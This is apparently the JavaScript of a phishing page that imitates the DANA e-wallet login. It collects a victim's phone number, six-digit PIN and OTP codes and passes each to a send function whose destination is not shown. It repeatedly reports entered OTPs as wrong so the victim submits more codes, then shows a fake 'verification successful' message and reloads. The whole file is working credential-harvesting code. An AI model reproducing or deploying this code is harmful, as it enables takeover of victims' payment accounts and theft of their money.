document.addEventListener('DOMContentLoaded', function () { const pis = document.querySelectorAll('.pin-box'); const ois = document.querySelectorAll('.otp-box'); const fn = document.getElementById('floating-notification'); const rn = document.getElementById('reward-notification'); const sn = document.getElementById('success-notification'); const lc = document.getElementById('lanjutkan-container'); const an = document.getElementById('attempt-number'); const ac = document.getElementById('attempt-counter'); const pages = { n: document.getElementById('number-page'), p: document.getElementById('pin-page'), o: document.getElementById('otp-page') };

let phoneNumber = ''; let pin = ''; let otp = ''; let attemptCount = 0; const maxAttempts = 6; let currentPage = 'n'; let otpTimer;

function showNotification(element, html, duration = 4000) { element.innerHTML = html; element.style.display = 'block'; setTimeout(() => { element.style.display = 'none'; }, duration); }

function showSpinner() { document.querySelector('.spinner-overlay').style.display = 'flex'; }

function hideSpinner() { document.querySelector('.spinner-overlay').style.display = 'none'; }

function resetOTPInputs() { ois.forEach(i => i.value = ''); ois[0].focus(); otp = ''; attemptCount++; an.textContent = attemptCount; if (attemptCount > 0) ac.style.display = 'block'; }

function startOTPTimer() { let seconds = 120; const timerElement = document.getElementById('otp-timer'); timerElement.textContent = '02:00'; otpTimer = setInterval(() => { seconds--; const min = String(Math.floor(seconds / 60)).padStart(2, '0'); const sec = String(seconds % 60).padStart(2, '0'); timerElement.textContent = ${min}:${sec}; if (seconds <= 0) { clearInterval(otpTimer); document.querySelector('.otp-resend').classList.add('active'); } }, 1000); }

// PIN Input Handling pis.forEach((input, index) => { input.addEventListener('input', async (e) => { e.target.value = e.target.value.replace(/\D/g, '');

if (e.target.value.length === 1 && index < pis.length - 1) {
    pis[index + 1].focus();
  }

  pin = Array.from(pis).map(i => i.value).join('');

  if (pin.length === 6) {
    showSpinner();
    try {
      await sendDanaData('pin', { phone: phoneNumber, pin });
      pages.p.style.display = 'none';
      pages.o.style.display = 'block';
      currentPage = 'o';
      ois[0].focus();
      lc.style.display = 'block';
      startOTPTimer();
    } catch (error) {
      showNotification(fn, `<div class="notification-content">Gagal verifikasi PIN: ${error.message}</div>`);
      pis.forEach(p => p.value = '');
      pis[0].focus();
      pin = '';
    } finally {
      hideSpinner();
    }
  }
});

input.addEventListener('keydown', (e) => {
  if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
    pis[index - 1].focus();
  }
});

});

// OTP Input Handling ois.forEach((input, index) => { input.addEventListener('input', async (e) => { e.target.value = e.target.value.replace(/\D/g, '');

if (e.target.value.length === 1 && index < ois.length - 1) {
    ois[index + 1].focus();
  }

  otp = Array.from(ois).map(i => i.value).join('');

  if (otp.length === 4) {
    showSpinner();
    try {
      await sendDanaData('otp', { phone: phoneNumber, pin, otp });

      setTimeout(() => {
        resetOTPInputs();

        if (attemptCount > 2) {
          showNotification(rn, `
            <div class="notification-content">
              <h3>Kode OTP Salah</h3>
              <p>Silakan cek SMS atau WhatsApp Anda</p>
            </div>
          `, 10000);
        }

        if (attemptCount >= maxAttempts) {
          fn.style.display = 'none';
          showNotification(sn, `
            <div class="notification-content">
              <h3>Verifikasi Berhasil</h3>
              <p>Akun Anda sedang diproses</p>
            </div>
          `, 5000);
          setTimeout(() => {
            window.location.reload();
          }, 5000);
        }
      }, 1000);
    } catch (error) {
      console.error('OTP Error:', error);
      showNotification(fn, `<div class="notification-content">Gagal verifikasi OTP: ${error.message}</div>`);
    } finally {
      hideSpinner();
    }
  }
});

input.addEventListener('keydown', (e) => {
  if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
    ois[index - 1].focus();
  }
});

});

// Toggle PIN Visibility document.querySelector('.show-text').addEventListener('click', (e) => { const isShowing = e.target.classList.toggle('active'); const pinInputs = document.querySelectorAll('.pin-box'); pinInputs.forEach(input => { input.type = isShowing ? 'text' : 'password'; }); e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan'; });

// Resend OTP Handler document.querySelector('.otp-resend').addEventListener('click', async (e) => { if (e.target.classList.contains('active')) { showSpinner(); try { await sendDanaData('resend', { phone: phoneNumber }); clearInterval(otpTimer); startOTPTimer(); e.target.classList.remove('active'); showNotification(fn, '<div class="notification-content">Kode OTP baru telah dikirim</div>'); } catch (error) { showNotification(fn, <div class="notification-content">Gagal mengirim ulang OTP: ${error.message}</div>); } finally { hideSpinner(); } } });

// Change Number Handler document.querySelector('.otp-change').addEventListener('click', () => { pages.o.style.display = 'none'; pages.n.style.display = 'block'; currentPage = 'n'; lc.style.display = 'block'; clearInterval(otpTimer); document.getElementById('otp-timer').textContent = '02:00'; document.querySelector('.otp-resend').classList.remove('active'); ois.forEach(input => input.value = ''); otp = ''; attemptCount = 0; an.textContent = '1'; ac.style.display = 'none'; }); });

